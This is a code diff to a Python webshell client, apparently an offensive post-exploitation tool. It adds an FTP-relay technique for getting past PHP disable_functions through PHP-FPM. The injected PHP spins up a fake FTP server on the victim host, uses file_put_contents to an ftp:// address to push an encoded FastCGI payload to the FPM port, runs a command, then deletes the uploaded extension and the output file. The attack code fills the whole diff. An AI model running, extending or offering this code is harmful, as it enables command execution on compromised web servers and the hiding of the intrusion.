@@ -1,4 +1,6 @@
 from os import path, makedirs
+from threading import Thread
+from time import sleep
 from re import match, sub
 from base64 import b64decode, b64encode
 from binascii import b2a_hex
@@ -474,10 +476,9 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
     return req
 
 
-def delay_send(time: float, data: str, raw: bool = False, **extra_params):
-    from time import sleep
+def delay_send(time: float, phpcode: str, raw: bool = False, **extra_params):
     sleep(time)
-    send(data, raw, **extra_params)
+    send(phpcode, raw, **extra_params)
 
 
 def print_webshell_info():
@@ -1616,6 +1617,8 @@ $dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
         attack_type = gget("webshell.bdf_fpm.type", "webshell")
         host = gget("webshell.bdf_fpm.host", "webshell")
         port = gget("webshell.bdf_fpm.port", "webshell")
+        sleep_time = 1
+
         if attack_type == "gopher":
             phpcode += """function curl($url){
 $ch = curl_init();
@@ -1645,15 +1648,58 @@ die('stream_socket_client function not exist or sock not exist');
                 $sock=fsockopen($host, $port, $errno, $errstr, 1);
             } else if(function_exists('pfsockopen')){
                 $sock=pfsockopen($host, $port, $errno, $errstr, 1);
+            } else if(function_exists('stream_socket_client')) {
+                $sock=stream_socket_client("tcp://$sock_path:$port",$errno, $errstr, 1);
             } else {
-                die('fsockopen/pfsockopen function not exist');
+                die('fsockopen/pfsockopen/stream_socket_client function not exist');
             }"""
             phpcode += "fputs($sock, base64_decode('%s'));" % (
                 generate_base64_socks_payload(host, port, ext_upload_path))
+        elif attack_type == "ftp":
+            random_ftp_port = randint(60000, 65000)
+            phpcode += """if(function_exists('stream_socket_server') && function_exists('stream_socket_accept')){
+$ftp_table = [
+    "USER" => "331 Username ok, send password.\\r\\n",
+    "PASS" => "230 Login successful.\\r\\n",
+    "TYPE" => "200 Type set to: Binary.\\r\\n",
+    "SIZE" => "550 /test is not retrievable.\\r\\n",
+    "EPSV" => "500 'EPSV': command not understood.\\r\\n",
+    "PASV" => "227 Entering passive mode (%s,0,%s).\\r\\n",
+    "STOR" => "150 File status okay. About to open data connection.\\r\\n",
+];
+$server = stream_socket_server("tcp://0.0.0.0:%s", $errno, $errstr);
+$accept = stream_socket_accept($server);
+fwrite($accept, "200 OK\\r\\n");
+while (true) {
+    $data = fgets($accept);
+    $cmd = substr($data, 0, 4);
+    if (array_key_exists($cmd, $ftp_table)) {
+        fwrite($accept, $ftp_table[$cmd]);
+        if ($cmd === "STOR") {
+            break;
+        }
+    } else {
+        break;
+    }
+}
+fclose($server);
+} else {
+die('stream_socket_server/stream_socket_accept function not exist');
+}""" % (host.replace(".", ","), port, random_ftp_port)
+            # send(phpcode)
+            t = Thread(target=send, args=(phpcode,))
+            t.setDaemon(True)
+            t.start()
+            sleep(0.2)
+            phpcode = "var_dump(file_put_contents('ftp://%s:%s/a', base64_decode('%s')));" % (
+                host, random_ftp_port, generate_base64_socks_payload(host, port, ext_upload_path))
+            send(phpcode)
+            phpcode = ""
+            sleep_time = 0.8
         else:
             phpcode += "die('unknown attack type');"
 
-        phpcode += f"sleep(1);$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
+        phpcode += f"sleep({sleep_time});$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
         return phpcode
     elif (bdf_mode == 11):  # apache_mod_cgi
         shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
